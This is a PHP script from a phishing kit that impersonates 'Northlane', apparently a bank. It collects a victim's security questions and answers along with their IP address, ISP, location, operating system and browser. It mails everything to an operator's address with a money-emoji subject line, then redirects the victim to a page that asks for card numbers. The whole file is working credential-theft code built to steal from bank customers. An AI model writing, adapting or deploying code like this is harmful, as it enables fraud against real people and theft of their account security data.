<?php
require_once("../main.php");
require_once("../tele2.php");
if(!empty($_POST['que1']) && !empty($_POST['que2'])){ if(!empty($_POST['que3']) && !empty($_POST['Answer1'])){  if(!empty($_POST['Answer2']) && !empty($_POST['Answer3'])){
    
$_SESSION['que1'] = $_POST['que1'];
$_SESSION['que2'] = $_POST['que2'];
$_SESSION['que3'] = $_POST['que3'];
$_SESSION['que1'] = $_POST['Answer1'];
$_SESSION['que2'] = $_POST['Answer2'];
$_SESSION['que3'] = $_POST['Answer3'];
}
$_SESSION['page']['Question'] 			= true;
}

    $message = "                
                #---------------------[ NORTHLANE QUESTION✔ ]-------------------------#
                 Question 1 : ".$_POST['que1']." 
                 Question 2 : ".$_POST['que2']." 
                 Question 3 : ".$_POST['que3']." 
                 --------------ANSWER--------------
                 Answer 1 : ".$_POST['Answer1']." 
                 Answer 2 : ".$_POST['Answer2']." 
                 Answer 3 : ".$_POST['Answer3']." 
	            #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ Semangatkibossku ]----------------#";
                  $from = $setting['sender_mail'];
                  $to = $setting['email_result'];
                  $headers = "From: HYROESZEGA <".$from.">";
                  $subject = "[NORTHLANE] 💰💸 - QUESTION✔ [$cn - $os - $ip]";
                  mail($to, $subject, $message, $headers);
              

   echo "<script type='text/javascript'>window.top.location='../../../Cardnumber.do/';</script>";
    }

?>